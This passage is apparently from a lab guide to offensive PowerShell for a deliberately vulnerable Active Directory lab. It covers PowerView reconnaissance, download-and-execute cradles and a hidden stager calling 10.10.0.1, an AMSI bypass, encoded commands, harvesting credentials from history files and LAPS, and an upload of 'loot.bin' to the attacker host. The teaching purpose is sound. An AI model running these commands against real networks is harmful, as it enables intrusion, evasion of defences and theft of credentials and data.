| 16777216 | 0x1000000 | Trusted to authenticate for delegation (constrained) |

Compose filters like `(userAccountControl:1.2.840.113556.1.4.803:=524288)` for "users/computers trusted for unconstrained delegation" — the LAT-018 hunt list.

---

## 3.11 PowerView — the offensive AD module

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) is the de facto offensive PowerShell module for AD recon and ACL abuse. Its cmdlets mirror the MS module's but use raw LDAP queries (no AD module dependency) and add offense-specific filters. It's largely unmaintained but still ships in every red-team toolbox, and most "modern" rewrites (`Get-DomainObjectAcl`, `Find-DomainShare`) keep the same API.

### Loading on a compromised host

```
# Method 1: download and dot-source
PS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.1/PowerView.ps1')

# Method 2: drop to disk
PS> $wc = New-Object Net.WebClient
PS> $wc.DownloadFile('http://10.10.0.1/PowerView.ps1','C:\Users\Public\pv.ps1')
PS> . C:\Users\Public\pv.ps1

# Method 3: from PowerShell URL
PS> Invoke-RestMethod -Uri http://10.10.0.1/PowerView.ps1 | Invoke-Expression
```

Defender on a real host will alert immediately. DVAD ships Defender off across all targets — exactly so you can exercise PowerView without engagement-of-EDR.

### Killer cmdlets

| PowerView | What it does | DVAD use |
|---|---|---|
| `Get-Domain` / `Get-NetDomain` | Domain info | basic recon |
| `Get-DomainController` | List DCs | basic recon |
| `Get-DomainUser` | User enum | ENUM-005 |
| `Get-DomainUser -SPN` | Find Kerberoastable accounts | CRED-001 setup |
| `Get-DomainUser -PreauthNotRequired` | AS-REP roastable | CRED-002 setup |
| `Get-DomainUser -AllowDelegation` | Unconstrained delegation users | DF-008 |
| `Get-DomainUser -TrustedToAuth` | Constrained delegation users | DF-009 |
| `Get-DomainGroup` / `Get-DomainGroupMember` | Group enum | ENUM-007 |
| `Get-DomainComputer` | Computer enum | ENUM-008 |
| `Get-DomainComputer -Unconstrained` | Computers with unconstrained delegation | DF-008 |
| `Get-NetSession -ComputerName X` | Active sessions on X (NetSessionEnum) | session hunting |
| `Get-NetLoggedon -ComputerName X` | Who's logged into X | hunting |
| `Find-DomainShare -CheckShareAccess` | Shares we can read | ENUM-010 |
| `Find-LocalAdminAccess` | Where am I local admin? | lateral mapping |
| `Get-DomainObjectAcl -Identity X -ResolveGUIDs` | ACLs on object X | ACL abuse |
| `Find-InterestingDomainAcl` | Non-default ACLs | ACL abuse |
| `Get-DomainTrust` / `Get-DomainTrustMapping` | Trust enum | DF-001/DF-002 |
| `Get-DomainPolicy` | Password policy | ENUM-013 |
| `Get-DomainGPO` | GPO enum | PE-038 setup |
| `Add-DomainObjectAcl` | Grant yourself rights | persistence |
| `Set-DomainObject` | Modify AD object attrs | RBCD setup |
| `Set-DomainUserPassword` | Reset a user's password | CRED-016 |
| `Add-DomainGroupMember` | Add to group | PE-016/PE-018 |

### Examples

Find every Kerberoastable account in the current domain:

```
PS> Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

Find ACEs where YOU are the trustee with privileged rights:

```
PS> $me = ([adsi]"LDAP://<SID=$(([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)>").samaccountname[0]
PS> Find-InterestingDomainAcl -ResolveGUIDs |
       Where-Object IdentityReferenceName -eq $me |
       Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType
```

Find computers with unconstrained delegation:

```
PS> Get-DomainComputer -Unconstrained -Properties dnshostname, operatingsystem
```

Map your local admin access:

```
PS> Find-LocalAdminAccess
```

That last one is BloodHound-lite for the lateral graph.

### PowerView vs BloodHound

PowerView gives you ad-hoc queries. **BloodHound** ingests data (via `SharpHound.exe` or `bloodhound-python`) into a Neo4j graph and lets you ask "shortest path from `alice` to Domain Admins." You'll use both: BloodHound for strategy, PowerView for tactics on the host.

---

## 3.12 AMSI, scripting logging, and what defenders see

The **Antimalware Scan Interface (AMSI)** is a Windows API that script engines (PowerShell, JScript, VBScript) call before evaluating content. The engine passes the buffer to `AmsiScanBuffer`, which forwards to registered AVs (Defender by default). If the scanner says "malicious," the engine refuses.

Bypass classics (each works for a window of time before being patched):

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

This flips a private static field that `AmsiUtils` reads on every scan. Other variants patch `AmsiScanBuffer` in memory with a `xor eax,eax; ret` stub, hook via hardware breakpoints, or downgrade by removing the `amsi.dll` from the process's module list.

PowerShell script-block logging (event 4104 in `Microsoft-Windows-PowerShell/Operational`) is **not** AMSI-dependent — it logs every parsed script block regardless of scan result. So even if you bypass AMSI, your obfuscated payload still lands in the event log. Defenders read those.

Module logging (event 4103) records pipeline calls. Transcription writes a per-session text file. The three together give defenders a near-complete view of what happened in PowerShell.

In DVAD, Defender (and therefore AMSI's primary backend) is disabled on all member servers and DCs. So you'll see *no* `4104` block on your shells. On `ws01` it's enabled — try the AMSI bypass and watch the event log via `Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational -MaxEvents 5`.

---

## 3.13 Constrained Language Mode

When AppLocker / WDAC is in policy mode, PowerShell runs in **Constrained Language Mode (CLM)**: no `Add-Type`, no `New-Object` for arbitrary types, no `Invoke-Expression` on arbitrary code, no calling .NET methods except an allowlisted set. Only signed/whitelisted scripts run in FullLanguage.

Test:

```
PS> $ExecutionContext.SessionState.LanguageMode
FullLanguage      # or ConstrainedLanguage, RestrictedLanguage, NoLanguage
```

Bypasses (research, mostly historical):

- **PowerShell v2 downgrade** — `powershell.exe -Version 2` ran the older engine without CLM. Fixed by removing v2 from supported features.
- **PoshC2 in CLM-aware mode** — uses only CLM-legal primitives.
- **Custom runspaces with FullLanguage** — `[runspacefactory]::CreateRunspace()` with explicit language mode. Blocked when CLM is active.

DVAD does not enforce CLM anywhere. Mentioned for awareness on real engagements.

---

## 3.14 Encoded commands

To pass a complex PowerShell payload through a single-line context (`-c`, scheduled task action, WMI Win32_Process.Create arg), encode to UTF-16-LE base64:

```bash
# from Kali
echo -n 'iex (irm http://10.10.0.1/p.ps1)' | iconv -t UTF-16LE | base64 -w0
```

Output:

```
aQBlAHgAIAAoAGkAcgBtACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAwAC4AMQAvAHAALgBwAHMAMQApAA==
```

Then on Windows:

```
powershell.exe -enc aQBlAHgAIAAoAGkAcgBtACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAwAC4AMQAvAHAALgBwAHMAMQApAA==
```

The `-enc` flag (`-EncodedCommand`) expects UTF-16-LE base64. Easy to forget; tooling like `posh` and `donut` handle it. From PowerShell:

```
PS> $bytes = [Text.Encoding]::Unicode.GetBytes("Get-Process | Out-File C:\Users\Public\out.txt")
PS> $enc = [Convert]::ToBase64String($bytes)
PS> $enc
```

Defenders detect `-enc` on the command line via 4688 + Sysmon 1. Several PS injectors layer encoding to evade naïve string matches, but the *fact* that you used `-enc` still shows up unless you build a non-encoded loader.

---

## 3.15 Error handling, try/catch, terminating vs non-terminating

PowerShell distinguishes **terminating errors** (throw exceptions) from **non-terminating** (record to `$Error`, keep going). By default, most cmdlet errors are non-terminating. `try/catch` only catches terminating errors.

```
try {
    Get-Item C:\NoSuchFile -ErrorAction Stop
} catch [System.Management.Automation.ItemNotFoundException] {
    Write-Warning "File not found"
} catch {
    Write-Warning "Caught: $($_.Exception.Message)"
} finally {
    "always runs"
}
```

To convert non-terminating to terminating, pass `-ErrorAction Stop` to the cmdlet, or set `$ErrorActionPreference = "Stop"` globally.

`throw "msg"` raises a `RuntimeException`. `throw [SomeException]::new("msg")` raises a typed exception.

`$Error[0]` is the most recent error (regardless of try/catch). `$Error.Clear()` resets.

---

## 3.16 Calling .NET directly

Anything you can do in C# you can do in PowerShell because .NET classes are first-class. The syntax `[Namespace.Type]::Method(args)`:

```
[System.IO.File]::ReadAllText("C:\Users\alice\Desktop\notes.txt")
[System.IO.File]::ReadAllBytes("C:\Users\alice\Desktop\image.png")
[System.Net.WebClient]::new().DownloadString("http://10.10.0.1/x")
[System.Net.WebRequest]::Create("http://10.10.0.1/y").GetResponse()
[System.Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello"))
[System.DirectoryServices.DirectoryEntry]::new("LDAP://DC=corp,DC=local")
[System.Security.Principal.WindowsIdentity]::GetCurrent()
[System.Security.Principal.WindowsBuiltInRole]::Administrator
[System.Net.Dns]::GetHostEntry("dc01.corp.local")
[System.Net.IPAddress]::Parse("10.10.0.10")
[System.Guid]::NewGuid()
[System.Math]::Pow(2,10)
[System.DateTime]::UtcNow
[System.Text.Encoding]::UTF8.GetBytes("foo")
[System.Text.Encoding]::Unicode.GetBytes("foo")    # UTF-16-LE
```

This is how PowerView reaches LDAP without needing the AD module, and how AMSI bypass tweaks .NET fields directly. It's also how every PowerShell shellcode-runner works.

---

## 3.17 Adding new code with `Add-Type`

`Add-Type` compiles C# at runtime and exposes it as a .NET class in the current session:

```
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll")]
    public static extern bool OpenProcessToken(IntPtr hProc, uint da, out IntPtr hTok);
}
"@

PS> $h = [Native]::GetCurrentProcess()
PS> $tok = [IntPtr]::Zero
PS> [Native]::OpenProcessToken($h, 0x8, [ref]$tok)
```

Many offensive PowerShell scripts use `Add-Type` to:
- P/Invoke Win32 APIs not exposed via existing cmdlets.
- Load shellcode-runner stubs (`VirtualAlloc → memcpy → CreateThread`).
- Build helper classes that operate on raw byte arrays.

CLM blocks `Add-Type`. AMSI scans the C# source. Both work as defensive layers in production.

---

## 3.18 PowerShell jobs and runspaces

For parallelism, PowerShell offers:

- **Background jobs** — `Start-Job { … }`, run in a separate `pwsh.exe`. Heavy.
- **Thread jobs (PS5.1 module / PS7 built-in)** — `Start-ThreadJob { … }`, in-process threads. Light.
- **Runspaces** — lower-level; build a `RunspacePool`, queue scriptblocks. What most offensive tools use for multi-host scans.

```
$pool = [runspacefactory]::CreateRunspacePool(1, 10)
$pool.Open()
$jobs = foreach ($host in $hosts) {
    $ps = [powershell]::Create().AddScript({
        param($h)
        Test-Connection -ComputerName $h -Count 1 -Quiet
    }).AddArgument($host)
    $ps.RunspacePool = $pool
    [pscustomobject]@{ PS = $ps; Handle = $ps.BeginInvoke(); Host = $host }
}
$results = $jobs | ForEach-Object {
    $r = $_.PS.EndInvoke($_.Handle); $_.PS.Dispose()
    [pscustomobject]@{ Host = $_.Host; Alive = $r }
}
$pool.Close(); $pool.Dispose()
```

You don't need to write this from scratch in DVAD — `nxc`, `crackmapexec`, `Invoke-PortScan` (PowerView) do it for you.

PS 7's `ForEach-Object -Parallel` is a friendlier wrapper:

```
$hosts | ForEach-Object -Parallel { Test-Connection $_ -Count 1 -Quiet } -ThrottleLimit 32
```

---

## 3.19 PowerShell as transport — the C2 layer

Many post-ex frameworks (Empire, PoshC2, Covenant) ship PowerShell stagers. Even outside frameworks, attackers chain:

```
powershell -nop -w hidden -ep bypass -c "$c=(iwr -useb http://10.10.0.1/s);iex $c"
```

That single line:
- Disables profile loading (`-nop`).
- Hides the window (`-w hidden`).
- Bypasses execution policy.
- Downloads the next stage (`Invoke-WebRequest -UseBasicParsing`).
- Executes it (`Invoke-Expression`).

Variants use `-EncodedCommand`, BITS transfer (`Start-BitsTransfer`), DNS exfil (custom), or named pipes for the second stage.

For DVAD you do not need a C2. Direct PowerShell over evil-winrm covers everything. Awareness is for reading attacker artefacts when you eventually do the defender exercises.

---

## 3.20 The PowerShell history file

PowerShell writes interactive history to:

```
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Anything an admin typed (including embedded passwords in `New-Object PSCredential`) is there. Always grep this when you land on a host:

```
PS> Get-Content (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
```

In DVAD, an admin's history on `ws01` contains a credential you'll want — that's CRED-022 (cross-reference PLAN.md).

---

## 3.21 Practical reference card

A few one-liners worth memorising:

```
# Whose token am I, in detail
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, AuthenticationType, ImpersonationLevel, Groups

# Current user's groups (resolved)
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }

# List enabled domain users
Get-ADUser -Filter 'Enabled -eq $true' -Properties LastLogonDate | Select-Object SamAccountName,LastLogonDate

# Find SPNs (Kerberoast)
Get-ADUser -LDAPFilter '(servicePrincipalName=*)' -Properties servicePrincipalName

# AS-REP roastable
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' -Properties servicePrincipalName

# Find delegation
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'    # unconstrained users
Get-ADComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' # unconstrained computers

# Find machines I'm local admin on (PowerView)
Find-LocalAdminAccess

# Read LAPS
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | Where-Object 'ms-Mcs-AdmPwd'

# Find users with msDS-KeyCredentialLink (Shadow Cred backdoors)
Get-ADUser -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink

# Network scan tiny
1..254 | ForEach-Object -Parallel { 
    $ip = "10.10.0.$_"
    if (Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) { $ip } 
} -ThrottleLimit 32

# Download file
Invoke-WebRequest -Uri http://10.10.0.1/file -OutFile C:\Users\Public\file -UseBasicParsing

# Upload via PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\loot.bin")
$body = @{ file = [Convert]::ToBase64String($bytes) }
Invoke-RestMethod -Uri http://10.10.0.1/u -Method Post -Body $body
```

Keep this card. Most of your DVAD session will be one of these.

---

## Lab exercises

### Exercise 3.A — First commands

In an `evil-winrm` session as `alice`:

```
*Evil-WinRM* PS> Get-Date
*Evil-WinRM* PS> Get-Host
*Evil-WinRM* PS> $PSVersionTable
*Evil-WinRM* PS> Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
*Evil-WinRM* PS> Get-Process | Get-Member | Select-Object Name,MemberType -First 20
*Evil-WinRM* PS> Get-Process notepad -ErrorAction SilentlyContinue
*Evil-WinRM* PS> $env:USERNAME; $env:USERDOMAIN; $env:COMPUTERNAME
```

Sketch: predict the output, then run, then diff with your expectation. Note the *type* of every result (`$x.GetType().Name`).

### Exercise 3.B — AD enumeration with the AD module

On a host with the AD module installed (DCs definitely have it):

```
*Evil-WinRM* PS> Import-Module ActiveDirectory
*Evil-WinRM* PS> Get-ADDomain
*Evil-WinRM* PS> Get-ADGroupMember "Domain Admins"
*Evil-WinRM* PS> Get-ADUser -Filter * -Properties DoesNotRequirePreAuth |
                    Where-Object { $_.DoesNotRequirePreAuth } |
                    Select-Object SamAccountName
```

The last query enumerates AS-REP roastable users (CRED-002). 

```
*Evil-WinRM* PS> Get-ADUser -Filter * -Properties servicePrincipalName |
                    Where-Object { $_.servicePrincipalName } |
                    Select-Object SamAccountName, servicePrincipalName
```

Kerberoastable list (CRED-001).

```
*Evil-WinRM* PS> Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation
```

Unconstrained delegation surface (DF-008).

### Exercise 3.C — Load PowerView

On Kali:

```bash
cd /tmp
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
python3 -m http.server 8000 --bind 10.10.0.1
```

On the victim:

```
*Evil-WinRM* PS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.1:8000/PowerView.ps1')
*Evil-WinRM* PS> Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
*Evil-WinRM* PS> Get-DomainUser -PreauthNotRequired
*Evil-WinRM* PS> Find-InterestingDomainAcl -ResolveGUIDs | Where-Object IdentityReferenceName -eq 'alice'
*Evil-WinRM* PS> Get-DomainComputer -Unconstrained
*Evil-WinRM* PS> Get-DomainTrust
*Evil-WinRM* PS> Find-LocalAdminAccess
```

Record the output of each. `Find-InterestingDomainAcl` will surface the path to your first privesc.

### Exercise 3.D — LDAP filter by hand

Without PowerView, replicate one of its queries:

```
*Evil-WinRM* PS> $s = [adsisearcher]"(servicePrincipalName=*)"
*Evil-WinRM* PS> $s.PageSize = 1000
*Evil-WinRM* PS> $s.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname')) | Out-Null
*Evil-WinRM* PS> $s.FindAll() | ForEach-Object {
                    [pscustomobject]@{
                        Name = $_.Properties.samaccountname[0]
                        SPNs = ($_.Properties.serviceprincipalname -join ', ')
                    }
                 }
```

Compare to `Get-DomainUser -SPN` — same answer, no module dependency.

### Exercise 3.E — Splatting drill

Re-write the following pipeline using splatting:

```
Get-ChildItem -Path C:\Users -Recurse -Force -Filter *.txt -ErrorAction SilentlyContinue | Select-Object FullName, Length
```

Solution:

```
$gciParams = @{
    Path        = "C:\Users"
    Recurse     = $true
    Force       = $true
    Filter      = "*.txt"
    ErrorAction = "SilentlyContinue"
}
Get-ChildItem @gciParams | Select-Object FullName, Length
```

### Exercise 3.F — PSReadline history grep

```
*Evil-WinRM* PS> $h = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
*Evil-WinRM* PS> if (Test-Path $h) { Get-Content $h }
*Evil-WinRM* PS> if (Test-Path $h) { Get-Content $h | Select-String -Pattern 'password|secret|cred|key|token' -SimpleMatch }
```

You won't always find something here on `alice`'s box. Try the same on every host you compromise. CRED-022 hides in one of them.

### Exercise 3.G — Encoded command

Build an encoded payload that prints `whoami` to a file:

```bash
echo -n 'whoami | Out-File C:\Users\Public\me.txt' | iconv -t UTF-16LE | base64 -w0
```

Then:

```
*Evil-WinRM* PS> powershell.exe -enc <that base64>
*Evil-WinRM* PS> Get-Content C:\Users\Public\me.txt
```

### Exercise 3.H — Multi-host CIM in parallel

```
*Evil-WinRM* PS> $targets = @('10.10.0.10','10.10.0.13','10.10.0.14','10.10.0.100')
*Evil-WinRM* PS> $cred = New-Object PSCredential('corp\alice', (ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force))
*Evil-WinRM* PS> Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
                    [pscustomobject]@{
                        Host = $env:COMPUTERNAME
                        OS   = (Get-CimInstance Win32_OperatingSystem).Caption
                        Up   = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
                    }
                 } -ThrottleLimit 5
```

If access denied on some hosts, that's expected (alice isn't admin everywhere). The error/success per host is your local-admin map. Cross-reference with `Find-LocalAdminAccess`.

---

## Self-check questions

1. What does it mean that "everything in PowerShell is an object"? Give an example where this is more powerful than text-pipeline bash.
2. What does `Get-Member` do and when do you use it?
3. What's the difference between `"$x"` and `'$x'`? Show a case where mixing them up breaks a script.
4. What's the difference between `Invoke-Command` and `Enter-PSSession`?
5. Write a one-liner that lists all enabled domain users whose `description` contains "service".
6. What is the LDAP filter for "user has an SPN"? How would you find users whose UAC flag includes `DoNotRequirePreAuth`?
7. What is the LDAP_MATCHING_RULE_IN_CHAIN OID, and what's an example query that benefits from it?
8. What's the difference between `-ErrorAction Continue` and `-ErrorAction Stop`? Which one enables `try/catch`?
9. How do you base64-encode a one-liner so `powershell.exe -enc` can run it? Why UTF-16-LE?
10. Why does PowerView exist when the AD module already covers most of this? Name two PowerView-only cmdlets that you'd reach for.
11. What is the "double-hop problem"? Name two ways to overcome it.
12. Where on disk is the PSReadline history file? Why is it interesting on a compromised admin's host?
13. What's the difference between `Start-Job`, `Start-ThreadJob`, and `Runspaces`?
14. What's the syntax to load a .NET type by its full name (e.g., `System.Net.WebClient`) and call a method on it?
15. What does CLM (Constrained Language Mode) restrict, and what's a known historical bypass?

---

## References

- **Microsoft Docs — PowerShell:** https://learn.microsoft.com/en-us/powershell/
- **`about_*` topics** — `Get-Help about_Pipelines`, `about_Operators`, `about_Functions_Advanced`, `about_Splatting`, `about_Comparison_Operators`. Read them.
- **PowerView (PowerSploit/Recon):** https://github.com/PowerShellMafia/PowerSploit
- **harmj0y — *I have the power(view)*** — SpecterOps blog series; the canonical PowerView intro.
- **adsecurity.org** — Sean Metcalf's PowerShell + AD cheatsheets.
- **Will Schroeder — *Sneaking Past PowerShell Constrained Language Mode*** — slide deck on CLM internals.
- **Bruce Payette — *Windows PowerShell in Action*** — language reference book (3rd ed. covers PS 5.1).
- **Lee Holmes — *Mastering PowerShell***  — Microsoft engineer's reference; great on streams and remoting.
- **Microsoft Docs — *WinRM Authentication*** — for double-hop and CredSSP details.

Next: [04-active-directory.md](04-active-directory.md).
